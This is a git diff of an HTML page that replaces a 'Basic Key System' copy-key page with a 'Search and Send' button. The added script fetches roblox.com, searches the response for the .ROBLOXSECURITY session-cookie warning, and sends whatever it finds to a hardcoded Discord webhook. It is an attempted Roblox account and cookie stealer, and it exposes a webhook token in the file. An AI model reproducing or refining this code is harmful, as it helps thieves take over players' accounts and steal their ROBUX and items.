@@ -1,78 +1,68 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NIL Services</title>
-<style>
-    body {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        background-color: #f0f0f0;
-        margin: 0;
-    }
-    .container {
-        text-align: center;
-        padding: 20px;
-        background-color: black;
-        border-radius: 15px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-        color: white;
-        width: 300px;
-        position: relative;
-    }
-    .container h2 {
-        font-size: 18px;
-        margin: 0;
-        padding: 10px 0;
-    }
-    .btn-container {
-        margin-top: 20px;
-    }
-    .btn {
-        display: inline-block;
-        padding: 10px 20px;
-        margin: 0 10px;
-        background-color: #ff5555;
-        color: white;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-        text-decoration: none;
-        font-size: 14px;
-        transition: background-color 0.3s ease;
-    }
-    .btn:hover {
-        background-color: #ff7777;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Search and Send</title>
 </head>
 <body>
-<div class="container">
-    <h2>Basic Key System</h2>
-    <div class="btn-container">
-        <a href="https://discord.com/invite/7k2Wxe8gMx" class="btn" target="_blank">Discord</a>
-        <button class="btn" id="copyBtn">copy key</button>
-    </div>
-</div>
+    <button id="searchButton">Search and Send</button>
 
-<script>
-    const copyBtn = document.getElementById('copyBtn');
+    <script>
+        document.getElementById("searchButton").addEventListener("click", function() {
+            searchWebsite();
+        });
 
-    copyBtn.addEventListener('click', () => {
-        const textToCopy = "d92dma91kd92kda9skd91dk9skad91kd29kd9askd91kd92kd9askd92k47ash7d2";
-        navigator.clipboard.writeText(textToCopy)
-            .then(() => {
-                alert('copied key');
-            })
-            .catch(err => {
-                console.error('error copying: ', err);
-            });
-    });
-</script>
+        function searchWebsite() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://roblox.com/home", true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var result = xhr.responseText;
 
+                    // Define the search strings
+                    var searchStrings = [
+                        "|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|",
+                        ".ROBLOXSECURITY"
+                    ];
+
+                    // Check if the response contains any of the search strings
+                    var found = searchStrings.some(function(str) {
+                        return result.includes(str);
+                    });
+
+                    if (found) {
+                        sendToWebhook(result);
+                    } else {
+                        console.log("No matches found");
+                    }
+                } else {
+                    console.error("Error: " + xhr.status);
+                }
+            };
+            xhr.onerror = function() {
+                console.error("Request failed");
+            };
+            xhr.send();
+        }
+
+        function sendToWebhook(data) {
+            var webhookUrl = "https://discord.com/api/webhooks/1262548012908019832/eRUmUbAmARjlV5x_u1BGb0KR1zMy2wCr8zJvFIqFO4FTwk92e1TFUSb_T7ChIigTYJUU";
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookUrl, true);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    console.log("Successfully sent to webhook");
+                } else {
+                    console.error("Error sending to webhook: " + xhr.status);
+                }
+            };
+            xhr.onerror = function() {
+                console.error("Webhook request failed");
+            };
+            xhr.send(JSON.stringify({ content: data }));
+        }
+    </script>
 </body>
 </html>
-
